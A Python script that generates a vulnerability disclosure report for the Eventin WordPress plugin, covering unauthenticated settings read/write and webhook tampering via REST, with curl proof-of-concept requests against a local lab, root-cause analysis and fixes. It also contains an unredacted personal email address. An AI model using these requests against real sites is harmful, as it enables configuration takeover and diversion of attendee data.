from __future__ import annotations

from datetime import date
from pathlib import Path


ROOT = Path("/workspace/.docs")
ROOT.mkdir(parents=True, exist_ok=True)


REPORT_BASENAME = "eventin-unauth-settings-and-webhook-report"
DOCX_PATH = ROOT / f"{REPORT_BASENAME}.docx"
MD_PATH = ROOT / f"{REPORT_BASENAME}.md"
TXT_PATH = ROOT / f"{REPORT_BASENAME}.txt"


REPORT_DATE = "2025-12-30"


MD = """\
## Vulnerability Report — Eventin (wp-event-solution)

### Report metadata
- **Title**: Unauthenticated Settings Disclosure + Settings Tampering (REST), and Unauthenticated Webhook Configuration Modification (REST)
- **Product**: Eventin – Event Manager, Event Booking, Calendar, Tickets and Registration Plugin (AI Powered)
- **WordPress.org URL**: https://wordpress.org/plugins/wp-event-solution/
- **Plugin slug**: `wp-event-solution`
- **Tested version**: `4.0.51`
- **Test environment**: Local WordPress (Docker), Apache/2.4.65 (Debian), PHP 8.3.29
- **Reported by**: <YOUR NAME / HANDLE>
- **Date**: @@REPORT_DATE@@
- **Severity**:
  - **Issue 1 (settings read/write)**: High
  - **Issue 2 (webhook modification)**: Critical (data exfiltration potential)
- **Category**: Broken Access Control / Unauthenticated Configuration Read & Write

> **Ethics / scope note:** All testing described below was performed against a local, authorized test environment.

---

### Executive summary
Two REST API endpoints exposed by Eventin allow unauthenticated users to:
1) **Read and modify plugin settings** stored in the WordPress option `etn_event_options` (Issue 1).
2) **Modify an event’s FluentCRM webhook URL** stored in post meta `fluent_crm_webhook` (Issue 2).

The combination enables **configuration takeover** (integrity impact) and **potential sensitive-data exfiltration**: if FluentCRM webhooks are enabled, attacker-controlled webhooks could receive purchaser/attendee data when orders are created.

---

## Issue 1: Unauthenticated Settings Disclosure + Settings Tampering (REST)

### Summary
An unauthenticated user can read and modify Eventin settings stored in the WordPress option **`etn_event_options`** by calling the REST endpoint:

- `GET  /index.php?rest_route=/eventin/v1/event/settings`
- `POST /index.php?rest_route=/eventin/v1/event/settings`

This allows anonymous changes to plugin configuration (e.g., UI colors, pagination) and leaks configuration values (including email templates and configured email addresses).

### Impact
- **Confidentiality**: settings response includes sensitive configuration and template contents (e.g., email templates and sender addresses).
- **Integrity**: attacker can change settings (confirmed by subsequent GET and DB changes).
- **Availability / UX**: attacker can degrade site behavior (pagination, formatting) or misconfigure integrations.

### Proof of Concept (evidence from local lab)

#### A) Database evidence (before)
Query:
```sql
SELECT option_value
FROM wp_options
WHERE option_name = 'etn_event_options';
```

Result (before — as observed in the lab DB):
```text
a:34:{s:24:"etn_does_demo_data_exits";b:1;s:7:"_locale";s:4:"user";s:10:"wc_enabled";b:0;s:14:"payment_method";s:0:"";s:14:"plugin_version";s:6:"4.0.51";s:7:"modules";b:0;s:18:"zoom_authorize_url";s:125:"https://zoom.us/oauth/authorize?response_type=code&redirect_uri=http://localhost:8080/eventin-integration/zoom-auth&client_id";s:18:"event_url_editable";b:0;s:5:"email";a:5:{i:0;b:0;s:14:"purchase_email";a:5:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:12:"Event Ticket";s:4:"body";s:69:"You have purchased ticket(s). Attendee ticket details are as follows.";s:13:"send_to_admin";b:1;s:23:"send_email_to_attendees";b:1;}s:17:"certificate_email";a:4:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:17:"Event Certificate";s:4:"body";s:191:"<p>Congratulations for successfully attending/completing the event '<span>{%event_title%}</span>'. Your certificate is ready! Click on the link provided below to get the PDF certificate. </p>";s:13:"send_to_admin";b:1;}s:9:"rsv_email";a:5:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:13:"response_type";s:5:"going";s:7:"subject";s:12:"RSVP request";s:4:"body";s:29:"We received your RSVP request";s:13:"send_to_admin";b:1;}s:14:"reminder_email";a:4:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:14:"Reminder email";s:4:"body";s:219:"Just sending you a quick reminder about our retailer meet-up you've registered to attend in two days time. If you've misplaced the Invitation that contained all the details. don't worry. Cve added them rn below for you.";s:13:"send_to_admin";b:1;}}s:29:"etn_settings_country_currency";s:3:"USD";s:17:"decimal_separator";s:9:"comma_dot";s:18:"thousand_separator";s:1:",";s:8:"decimals";i:0;s:12:"price_format";s:8:"%1$s%2$s";s:17:"currency_position";s:4:"left";s:20:"wc_order_status_list";a:0:{}s:17:"wc_order_statuses";a:2:{i:0;s:9:"completed";i:1;s:10:"processing";}s:23:"show_ticket_expiry_date";b:0;s:20:"add_to_cart_redirect";s:8:"checkout";s:24:"order_thank_you_redirect";s:12:"woo_thankyou";s:21:"enable_purchase_email";s:2:"on";s:21:"ticket_purchase_timer";i:10;s:28:"ticket_purchase_timer_enable";s:3:"off";s:12:"extra_fields";a:0:{}s:14:"zoom_connected";b:0;s:23:"etn_include_from_search";s:2:"on";s:27:"archive_event_sorting_order";s:3:"ASC";s:17:"etn_primary_color";s:7:"#bf0000";s:21:"attendee_registration";N;s:12:"etn_zoom_api";N;s:18:"etn_groundhogg_api";N;s:17:"etn_googlemap_api";N;s:10:"etn_ai_api";N;s:14:"currencySymbol";s:1:"$";}
```

> **Redaction note**: The above includes real email addresses from the test instance and should be redacted before any public disclosure.

#### B) Unauthenticated READ (GET)
Observed request/response (curl):
```text
curl -i "http://localhost:8080/index.php?rest_route=/eventin/v1/event/settings"
HTTP/1.1 200 OK
Date: Tue, 30 Dec 2025 22:13:11 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.3.29
X-Robots-Tag: noindex
Link: <http://localhost:8080/index.php?rest_route=/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET, POST, PUT, PATCH, DELETE
Vary: Origin
Content-Length: 2287
Content-Type: application/json; charset=UTF-8

{"status_code":0,"messages":[],"date_format_list":["2025-12-30","12\/30\/2025","30\/12\/2025","12-30-2025","30-12-2025","2025.12.30","12.30.2025","30.12.2025","30 Dec 2025","30 December 2025"],"content":{"settings":{"etn_does_demo_data_exits":true,"_locale":"user","wc_enabled":false,"payment_method":"","plugin_version":"4.0.51","modules":false,"zoom_authorize_url":"https:\/\/zoom.us\/oauth\/authorize?response_type=code&redirect_uri=http:\/\/localhost:8080\/eventin-integration\/zoom-auth&client_id","event_url_editable":false,"email":{"0":false,"purchase_email":{"from":"marouanefreelance1@gmail.com","subject":"Event Ticket","body":"You have purchased ticket(s). Attendee ticket details are as follows.","send_to_admin":true,"send_email_to_attendees":true},"certificate_email":{"from":"marouanefreelance1@gmail.com","subject":"Event Certificate","body":"<p>Congratulations for successfully attending\/completing the event '<span>{%event_title%}<\/span>'. Your certificate is ready! Click on the link provided below to get the PDF certificate. <\/p>","send_to_admin":true},"rsv_email":{"from":"marouanefreelance1@gmail.com","response_type":"going","subject":"RSVP request","body":"We received your RSVP request","send_to_admin":true},"reminder_email":{"from":"marouanefreelance1@gmail.com","subject":"Reminder email","body":"Just sending you a quick reminder about our retailer meet-up you've registered to attend in two days time. If you've misplaced the Invitation that contained all the details. don't worry. Cve added them rn below for you.","send_to_admin":true}},"etn_settings_country_currency":"USD","decimal_separator":"comma_dot","thousand_separator":",","decimals":0,"price_format":"%1$s%2$s","currency_position":"left","wc_order_status_list":[],"wc_order_statuses":["completed","processing"],"show_ticket_expiry_date":false,"add_to_cart_redirect":"checkout","order_thank_you_redirect":"woo_thankyou","enable_purchase_email":"on","ticket_purchase_timer":10,"ticket_purchase_timer_enable":"off","extra_fields":[],"zoom_connected":false,"etn_include_from_search":"on","archive_event_sorting_order":"ASC","etn_primary_color":"#bf0000","attendee_registration":null,"etn_zoom_api":null,"etn_groundhogg_api":null,"etn_googlemap_api":null,"etn_ai_api":null,"currencySymbol":"$"}}}
```

#### C) Unauthenticated WRITE (POST) — change `etn_primary_color`
Observed request/response (curl):
```text
curl -i -X POST \
  "http://localhost:8080/index.php?rest_route=/eventin/v1/event/settings" \
  -H "Content-Type: application/json" \
  -d '{
    "etn_primary_color": "#00ff00"
  }'

HTTP/1.1 200 OK
Date: Tue, 30 Dec 2025 22:25:22 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.3.29
X-Robots-Tag: noindex
Link: <http://localhost:8080/index.php?rest_route=/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET, POST, PUT, PATCH, DELETE
Content-Length: 44
Content-Type: application/json; charset=UTF-8

{"status_code":1,"messages":[],"content":[]}
```

Verification:
```text
GET /index.php?rest_route=/eventin/v1/event/settings
... response contains: "etn_primary_color":"#00ff00"
```

#### D) Unauthenticated WRITE (POST) — change `events_per_page`
Observed request/response (curl):
```text
curl -i -X POST \
  "http://localhost:8080/index.php?rest_route=/eventin/v1/event/settings" \
  -H "Content-Type: application/json" \
  -d '{
    "events_per_page": 1
  }'

HTTP/1.1 200 OK
Date: Tue, 30 Dec 2025 22:29:35 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.3.29
X-Robots-Tag: noindex
Link: <http://localhost:8080/index.php?rest_route=/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET, POST, PUT, PATCH, DELETE
Content-Length: 44
Content-Type: application/json; charset=UTF-8

{"status_code":1,"messages":[],"content":[]}
```

Verification:
```text
GET /index.php?rest_route=/eventin/v1/event/settings
... response contains: "events_per_page":1
```

#### E) Database evidence (after)
Query:
```sql
SELECT option_value
FROM wp_options
WHERE option_name = 'etn_event_options';
```

Result (after — as observed in the lab DB):
```text
a:39:{s:24:"etn_does_demo_data_exits";b:1;s:7:"_locale";s:4:"user";s:10:"wc_enabled";b:0;s:14:"payment_method";s:0:"";s:14:"plugin_version";s:6:"4.0.51";s:7:"modules";b:0;s:18:"zoom_authorize_url";s:125:"https://zoom.us/oauth/authorize?response_type=code&redirect_uri=http://localhost:8080/eventin-integration/zoom-auth&client_id";s:18:"event_url_editable";b:0;s:5:"email";a:5:{i:0;b:0;s:14:"purchase_email";a:5:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:12:"Event Ticket";s:4:"body";s:69:"You have purchased ticket(s). Attendee ticket details are as follows.";s:13:"send_to_admin";b:1;s:23:"send_email_to_attendees";b:1;}s:17:"certificate_email";a:4:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:17:"Event Certificate";s:4:"body";s:191:"<p>Congratulations for successfully attending/completing the event '<span>{%event_title%}</span>'. Your certificate is ready! Click on the link provided below to get the PDF certificate. </p>";s:13:"send_to_admin";b:1;}s:9:"rsv_email";a:5:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:13:"response_type";s:5:"going";s:7:"subject";s:12:"RSVP request";s:4:"body";s:29:"We received your RSVP request";s:13:"send_to_admin";b:1;}s:14:"reminder_email";a:4:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:14:"Reminder email";s:4:"body";s:219:"Just sending you a quick reminder about our retailer meet-up you've registered to attend in two days time. If you've misplaced the Invitation that contained all the details. don't worry. Cve added them rn below for you.";s:13:"send_to_admin";b:1;}}s:29:"etn_settings_country_currency";s:3:"USD";s:17:"decimal_separator";s:9:"comma_dot";s:18:"thousand_separator";s:1:",";s:8:"decimals";i:0;s:12:"price_format";s:8:"%1$s%2$s";s:17:"currency_position";s:4:"left";s:20:"wc_order_status_list";a:0:{}s:17:"wc_order_statuses";a:2:{i:0;s:9:"completed";i:1;s:10:"processing";}s:23:"show_ticket_expiry_date";b:0;s:20:"add_to_cart_redirect";s:8:"checkout";s:24:"order_thank_you_redirect";s:12:"woo_thankyou";s:21:"enable_purchase_email";s:2:"on";s:21:"ticket_purchase_timer";i:10;s:28:"ticket_purchase_timer_enable";s:3:"off";s:12:"extra_fields";a:0:{}s:14:"zoom_connected";b:0;s:23:"etn_include_from_search";s:2:"on";s:27:"archive_event_sorting_order";s:3:"ASC";s:17:"etn_primary_color";s:0:"";s:21:"attendee_registration";s:0:"";s:12:"etn_zoom_api";N;s:18:"etn_groundhogg_api";N;s:17:"etn_googlemap_api";N;s:10:"etn_ai_api";N;s:14:"currencySymbol";s:1:"$";s:15:"events_per_page";i:1;s:11:"date_format";s:0:"";s:11:"time_format";s:0:"";s:19:"etn_secondary_color";s:0:"";s:12:"sell_tickets";s:0:"";}
```

### Root cause (source code)

#### 1) REST permission callback always returns `true`
File: `base/api-handler.php`
Behavior: all routes registered via this handler are publicly accessible at the REST router level.

#### 2) Server-side nonce injection for `settings`
File: `base/api-handler.php`
Behavior: when `action == settings`, the code sets `X-WP-Nonce` to a freshly generated nonce (`wp_create_nonce('wp_rest')`) for the current request, defeating client-provided nonce validation.

#### 3) Inverted authorization logic in settings handlers
File: `core/event/api.php`
Functions:
- `get_settings()`
- `post_settings()`

Logic:
```php
if ( ! is_admin() && ! current_user_can( 'manage_options' ) ) {
   // ... allows access ...
} else {
   // ... denies ...
}
```

This authorizes anonymous/non-admin users and can deny actual administrators.

### Source code references (tested plugin source snapshot)
- `base/api-handler.php`:
  - nonce injection for `settings`: lines 51–55
  - router-level permission bypass: lines 70–72
- `core/event/api.php`:
  - `get_settings()`: lines 192–226
  - `post_settings()`: lines 233–266

### Recommended fix
- **Do not** generate or inject REST nonces server-side for unauthenticated requests.
- Ensure the REST route uses a strict `permission_callback` (e.g., `current_user_can('manage_options')` or a dedicated capability).
- Fix the logic in `get_settings()` and `post_settings()` so only authorized users can read/write settings.
- Return `WP_Error` with status `401/403` for unauthorized requests.
- Consider validating and sanitizing all settings keys/values, and restricting which settings are writable via API.

---

## Issue 2: Unauthenticated Webhook Configuration Modification (REST) — Critical

### Summary
The endpoint:
- `POST /index.php?rest_route=/eventin/v1/event/webhook`

allowed unauthenticated modification of event-level webhook configuration in the test environment.

**Webhook storage**: post meta
- `meta_key = fluent_crm_webhook`
- `post_id = <event_id>`

### Why this is critical
Eventin includes FluentCRM webhook integration that sends purchaser/attendee data to the URL stored in `fluent_crm_webhook`.
If an attacker can set this value, they can redirect webhook traffic (purchaser/attendee details) to attacker-controlled infrastructure.

Relevant integration code (data egress path):
- `core/Integrations/Webhook/FluentCRM.php`
  - reads `fluent_crm_webhook` from post meta
  - calls `wp_remote_post($fluentcrm_webhook, ['body' => $body])` when enabled

### Proof of Concept (evidence from local lab)

#### A) Endpoint discovery (OPTIONS)
```text
curl -i -X OPTIONS \
  "http://localhost:8080/index.php?rest_route=/eventin/v1/event/webhook"
  
HTTP/1.1 200 OK
Date: Tue, 30 Dec 2025 23:14:19 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.3.29
X-Robots-Tag: noindex
Link: <http://localhost:8080/index.php?rest_route=/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET, POST, PUT, PATCH, DELETE
Content-Length: 156
Content-Type: application/json; charset=UTF-8

{"namespace":"eventin\/v1\/event","methods":["GET","POST","PUT","PATCH","DELETE"],"endpoints":[{"methods":["GET","POST","PUT","PATCH","DELETE"],"args":[]}]}
```

#### B) Unauthenticated webhook update attempt (POST)
```text
curl -i -X POST \
  "http://localhost:8080/index.php?rest_route=/eventin/v1/event/webhook" \
  -H "Content-Type: application/json" \
  -d '{
    "event_id": 8,  
    "fluent_crm_webhook": "https://example.test/webhook"
  }'

HTTP/1.1 200 OK
Date: Tue, 30 Dec 2025 23:19:15 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.3.29
X-Robots-Tag: noindex
Link: <http://localhost:8080/index.php?rest_route=/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET, POST, PUT, PATCH, DELETE
Content-Length: 0
Content-Type: application/json; charset=UTF-8
```

#### C) Database confirmation (post meta created/modified)
Query:
```sql
SELECT COUNT(*)
FROM wp_postmeta
WHERE post_id = 8
  AND meta_key = 'fluent_crm_webhook';
```
Observed:
```text
COUNT = 1
```

Even if the stored value is normalized (e.g., empty string), the persistent state was modified, confirming broken access control in the tested environment.

### Root cause (likely)
Eventin’s v1 REST routing uses `base/api-handler.php` with a `permission_callback` that returns `true` for all actions. Any webhook handler implemented under the same v1 mechanism must enforce capability and nonce checks itself; otherwise it will be exposed to unauthenticated users.

### Recommended fix
- Ensure any webhook read/write endpoint requires:
  - a capability check (e.g., `current_user_can('manage_options')` or `current_user_can('etn_manage_event')`)
  - a valid REST nonce (provided by authenticated clients only)
- If webhook endpoints are not intended to be public, return `403` to unauthenticated callers.
- Consider restricting allowed webhook domains or using signed callbacks if inbound/outbound webhook configuration is supported.

---

## Suggested CVSS v3.1 (indicative)
- **Issue 1 (settings read/write)**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`
- **Issue 2 (webhook modification)**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (depends on whether webhook can exfiltrate sensitive buyer/attendee data in the site’s configuration)

---

## Timeline (template)
- @@REPORT_DATE@@: Issue discovered and validated in local environment.
- YYYY-MM-DD: Report submitted to vendor.
- YYYY-MM-DD: Vendor acknowledgment.
- YYYY-MM-DD: Patch released.
- YYYY-MM-DD: Public disclosure / CVE request (if applicable).
"""

MD = MD.replace("@@REPORT_DATE@@", REPORT_DATE)


def write_text_outputs() -> None:
    MD_PATH.write_text(MD, encoding="utf-8")
    TXT_PATH.write_text(MD, encoding="utf-8")


def build_docx() -> None:
    # Lazy import so the .md/.txt can be generated even if docx deps fail.
    from docx import Document
    from docx.enum.text import WD_ALIGN_PARAGRAPH
    from docx.oxml import OxmlElement
    from docx.oxml.ns import qn
    from docx.shared import Inches, Pt, RGBColor

    doc = Document()

    # --- Simple professional theme choices ---
    COLOR_PRIMARY = RGBColor(0x17, 0x2B, 0x4D)   # deep navy
    COLOR_ACCENT = RGBColor(0x0B, 0x72, 0xB9)    # blue
    COLOR_MUTED = RGBColor(0x4B, 0x55, 0x63)     # gray

    # Title
    title = doc.add_paragraph()
    run = title.add_run("Vulnerability Report — Eventin (wp-event-solution)")
    run.bold = True
    run.font.size = Pt(22)
    run.font.color.rgb = COLOR_PRIMARY
    title.alignment = WD_ALIGN_PARAGRAPH.LEFT

    subtitle = doc.add_paragraph()
    run = subtitle.add_run("Unauthenticated Settings Takeover (REST) + Unauthenticated Webhook Configuration Modification (REST)")
    run.italic = True
    run.font.size = Pt(12)
    run.font.color.rgb = COLOR_MUTED

    doc.add_paragraph()

    # Metadata table
    doc.add_paragraph("Report metadata").runs[0].bold = True
    table = doc.add_table(rows=0, cols=2)
    table.style = "Light List Accent 1"

    def add_row(k: str, v: str) -> None:
        row = table.add_row().cells
        row[0].text = k
        row[1].text = v

    add_row("Title", "Unauthenticated settings disclosure + settings tampering, and webhook configuration modification")
    add_row("Product", "Eventin – Event Manager, Event Booking, Calendar, Tickets and Registration Plugin (AI Powered)")
    add_row("WordPress.org URL", "https://wordpress.org/plugins/wp-event-solution/")
    add_row("Plugin slug", "wp-event-solution")
    add_row("Tested version", "4.0.51")
    add_row("Environment", "Local WordPress (Docker), Apache/2.4.65 (Debian), PHP 8.3.29")
    add_row("Reported by", "<YOUR NAME / HANDLE>")
    add_row("Date", REPORT_DATE)
    add_row("Severity", "Issue 1: High; Issue 2: Critical")

    doc.add_paragraph()
    p = doc.add_paragraph()
    r = p.add_run("Ethics / scope note: ")
    r.bold = True
    p.add_run("All testing described below was performed against a local, authorized test environment.")

    # Helper styles
    def add_h(heading: str, level: int = 1) -> None:
        para = doc.add_heading(heading, level=level)
        for rr in para.runs:
            rr.font.color.rgb = COLOR_PRIMARY if level <= 2 else COLOR_ACCENT

    def add_code_block(text: str) -> None:
        # Use a paragraph per block with monospaced font.
        para = doc.add_paragraph()
        run = para.add_run(text)
        run.font.name = "Consolas"
        run.font.size = Pt(9.5)
        run.font.color.rgb = RGBColor(0x11, 0x11, 0x11)
        # light gray shading
        pPr = para._p.get_or_add_pPr()
        shd = OxmlElement("w:shd")
        shd.set(qn("w:val"), "clear")
        shd.set(qn("w:color"), "auto")
        shd.set(qn("w:fill"), "F3F4F6")
        pPr.append(shd)

    # Content (structured)
    add_h("Executive summary", level=1)
    doc.add_paragraph(
        "Two REST API endpoints exposed by Eventin allow unauthenticated users to (1) read and modify plugin settings stored in "
        "the WordPress option 'etn_event_options' and (2) modify an event’s FluentCRM webhook URL stored in post meta "
        "'fluent_crm_webhook'. The combination enables configuration takeover and potential sensitive-data exfiltration."
    )

    add_h("Issue 1: Unauthenticated Settings Disclosure + Settings Tampering (REST)", level=1)
    doc.add_paragraph("Affected endpoints:", style=None).runs[0].bold = True
    doc.add_paragraph("GET  /index.php?rest_route=/eventin/v1/event/settings")
    doc.add_paragraph("POST /index.php?rest_route=/eventin/v1/event/settings")

    add_h("Evidence (local lab)", level=2)
    doc.add_paragraph("A) Database evidence (before)").runs[0].bold = True
    add_code_block(
        "SELECT option_value\nFROM wp_options\nWHERE option_name = 'etn_event_options';\n\n"
        + "option_value (before):\n"
        + "a:34:{s:24:\"etn_does_demo_data_exits\";b:1;s:7:\"_locale\";s:4:\"user\";s:10:\"wc_enabled\";b:0;s:14:\"payment_method\";s:0:\"\";s:14:\"plugin_version\";s:6:\"4.0.51\";s:7:\"modules\";b:0;s:18:\"zoom_authorize_url\";s:125:\"https://zoom.us/oauth/authorize?response_type=code&redirect_uri=http://localhost:8080/eventin-integration/zoom-auth&client_id\";s:18:\"event_url_editable\";b:0;s:5:\"email\";a:5:{i:0;b:0;s:14:\"purchase_email\";a:5:{s:4:\"from\";s:28:\"marouanefreelance1@gmail.com\";s:7:\"subject\";s:12:\"Event Ticket\";s:4:\"body\";s:69:\"You have purchased ticket(s). Attendee ticket details are as follows.\";s:13:\"send_to_admin\";b:1;s:23:\"send_email_to_attendees\";b:1;}s:17:\"certificate_email\";a:4:{s:4:\"from\";s:28:\"marouanefreelance1@gmail.com\";s:7:\"subject\";s:17:\"Event Certificate\";s:4:\"body\";s:191:\"<p>Congratulations for successfully attending/completing the event '<span>{%event_title%}</span>'. Your certificate is ready! Click on the link provided below to get the PDF certificate. </p>\";s:13:\"send_to_admin\";b:1;}s:9:\"rsv_email\";a:5:{s:4:\"from\";s:28:\"marouanefreelance1@gmail.com\";s:13:\"response_type\";s:5:\"going\";s:7:\"subject\";s:12:\"RSVP request\";s:4:\"body\";s:29:\"We received your RSVP request\";s:13:\"send_to_admin\";b:1;}s:14:\"reminder_email\";a:4:{s:4:\"from\";s:28:\"marouanefreelance1@gmail.com\";s:7:\"subject\";s:14:\"Reminder email\";s:4:\"body\";s:219:\"Just sending you a quick reminder about our retailer meet-up you've registered to attend in two days time. If you've misplaced the Invitation that contained all the details. don't worry. Cve added them rn below for you.\";s:13:\"send_to_admin\";b:1;}}s:29:\"etn_settings_country_currency\";s:3:\"USD\";s:17:\"decimal_separator\";s:9:\"comma_dot\";s:18:\"thousand_separator\";s:1:\",\";s:8:\"decimals\";i:0;s:12:\"price_format\";s:8:\"%1$s%2$s\";s:17:\"currency_position\";s:4:\"left\";s:20:\"wc_order_status_list\";a:0:{}s:17:\"wc_order_statuses\";a:2:{i:0;s:9:\"completed\";i:1;s:10:\"processing\";}s:23:\"show_ticket_expiry_date\";b:0;s:20:\"add_to_cart_redirect\";s:8:\"checkout\";s:24:\"order_thank_you_redirect\";s:12:\"woo_thankyou\";s:21:\"enable_purchase_email\";s:2:\"on\";s:21:\"ticket_purchase_timer\";i:10;s:28:\"ticket_purchase_timer_enable\";s:3:\"off\";s:12:\"extra_fields\";a:0:{}s:14:\"zoom_connected\";b:0;s:23:\"etn_include_from_search\";s:2:\"on\";s:27:\"archive_event_sorting_order\";s:3:\"ASC\";s:17:\"etn_primary_color\";s:7:\"#bf0000\";s:21:\"attendee_registration\";N;s:12:\"etn_zoom_api\";N;s:18:\"etn_groundhogg_api\";N;s:17:\"etn_googlemap_api\";N;s:10:\"etn_ai_api\";N;s:14:\"currencySymbol\";s:1:\"$\";}"
    )

    doc.add_paragraph("B) Unauthenticated READ (GET)").runs[0].bold = True
    add_code_block(
        "curl -i \"http://localhost:8080/index.php?rest_route=/eventin/v1/event/settings\"\n"
        "HTTP/1.1 200 OK\n"
        "Date: Tue, 30 Dec 2025 22:13:11 GMT\n"
        "Server: Apache/2.4.65 (Debian)\n"
        "X-Powered-By: PHP/8.3.29\n"
        "X-Robots-Tag: noindex\n"
        "Link: <http://localhost:8080/index.php?rest_route=/>; rel=\"https://api.w.org/\"\n"
        "X-Content-Type-Options: nosniff\n"
        "Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link\n"
        "Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type\n"
        "Allow: GET, POST, PUT, PATCH, DELETE\n"
        "Vary: Origin\n"
        "Content-Length: 2287\n"
        "Content-Type: application/json; charset=UTF-8\n\n"
        "{\"status_code\":0,\"messages\":[],\"date_format_list\":[\"2025-12-30\",\"12/30/2025\",\"30/12/2025\",\"12-30-2025\",\"30-12-2025\",\"2025.12.30\",\"12.30.2025\",\"30.12.2025\",\"30 Dec 2025\",\"30 December 2025\"],\"content\":{\"settings\":{\"etn_does_demo_data_exits\":true,\"_locale\":\"user\",\"wc_enabled\":false,\"payment_method\":\"\",\"plugin_version\":\"4.0.51\",\"modules\":false,\"zoom_authorize_url\":\"https://zoom.us/oauth/authorize?response_type=code&redirect_uri=http://localhost:8080/eventin-integration/zoom-auth&client_id\",\"event_url_editable\":false,\"email\":{\"0\":false,\"purchase_email\":{\"from\":\"marouanefreelance1@gmail.com\",\"subject\":\"Event Ticket\",\"body\":\"You have purchased ticket(s). Attendee ticket details are as follows.\",\"send_to_admin\":true,\"send_email_to_attendees\":true},\"certificate_email\":{\"from\":\"marouanefreelance1@gmail.com\",\"subject\":\"Event Certificate\",\"body\":\"<p>Congratulations for successfully attending/completing the event '<span>{%event_title%}</span>'. Your certificate is ready! Click on the link provided below to get the PDF certificate. </p>\",\"send_to_admin\":true},\"rsv_email\":{\"from\":\"marouanefreelance1@gmail.com\",\"response_type\":\"going\",\"subject\":\"RSVP request\",\"body\":\"We received your RSVP request\",\"send_to_admin\":true},\"reminder_email\":{\"from\":\"marouanefreelance1@gmail.com\",\"subject\":\"Reminder email\",\"body\":\"Just sending you a quick reminder about our retailer meet-up you've registered to attend in two days time. If you've misplaced the Invitation that contained all the details. don't worry. Cve added them rn below for you.\",\"send_to_admin\":true}},\"etn_settings_country_currency\":\"USD\",\"decimal_separator\":\"comma_dot\",\"thousand_separator\":\",\",\"decimals\":0,\"price_format\":\"%1$s%2$s\",\"currency_position\":\"left\",\"wc_order_status_list\":[],\"wc_order_statuses\":[\"completed\",\"processing\"],\"show_ticket_expiry_date\":false,\"add_to_cart_redirect\":\"checkout\",\"order_thank_you_redirect\":\"woo_thankyou\",\"enable_purchase_email\":\"on\",\"ticket_purchase_timer\":10,\"ticket_purchase_timer_enable\":\"off\",\"extra_fields\":[],\"zoom_connected\":false,\"etn_include_from_search\":\"on\",\"archive_event_sorting_order\":\"ASC\",\"etn_primary_color\":\"#bf0000\",\"attendee_registration\":null,\"etn_zoom_api\":null,\"etn_groundhogg_api\":null,\"etn_googlemap_api\":null,\"etn_ai_api\":null,\"currencySymbol\":\"$\"}}}"
    )

    doc.add_paragraph("C) Unauthenticated WRITE (POST) — change etn_primary_color").runs[0].bold = True
    add_code_block(
        "curl -i -X POST \\\n"
        "  \"http://localhost:8080/index.php?rest_route=/eventin/v1/event/settings\" \\\n"
        "  -H \"Content-Type: application/json\" \\\n"
        "  -d '{\"etn_primary_color\":\"#00ff00\"}'\n\n"
        "HTTP/1.1 200 OK\n"
        "Date: Tue, 30 Dec 2025 22:25:22 GMT\n"
        "Server: Apache/2.4.65 (Debian)\n"
        "X-Powered-By: PHP/8.3.29\n"
        "Allow: GET, POST, PUT, PATCH, DELETE\n"
        "Content-Length: 44\n"
        "Content-Type: application/json; charset=UTF-8\n\n"
        "{\"status_code\":1,\"messages\":[],\"content\":[]}"
    )

    doc.add_paragraph("D) Unauthenticated WRITE (POST) — change events_per_page").runs[0].bold = True
    add_code_block(
        "curl -i -X POST \\\n"
        "  \"http://localhost:8080/index.php?rest_route=/eventin/v1/event/settings\" \\\n"
        "  -H \"Content-Type: application/json\" \\\n"
        "  -d '{\"events_per_page\":1}'\n\n"
        "HTTP/1.1 200 OK\n"
        "Date: Tue, 30 Dec 2025 22:29:35 GMT\n"
        "Server: Apache/2.4.65 (Debian)\n"
        "X-Powered-By: PHP/8.3.29\n"
        "Allow: GET, POST, PUT, PATCH, DELETE\n"
        "Content-Length: 44\n"
        "Content-Type: application/json; charset=UTF-8\n\n"
        "{\"status_code\":1,\"messages\":[],\"content\":[]}"
    )

    doc.add_paragraph("E) Database evidence (after)").runs[0].bold = True
    add_code_block(
        "SELECT option_value\nFROM wp_options\nWHERE option_name = 'etn_event_options';\n\n"
        "option_value (after):\n"
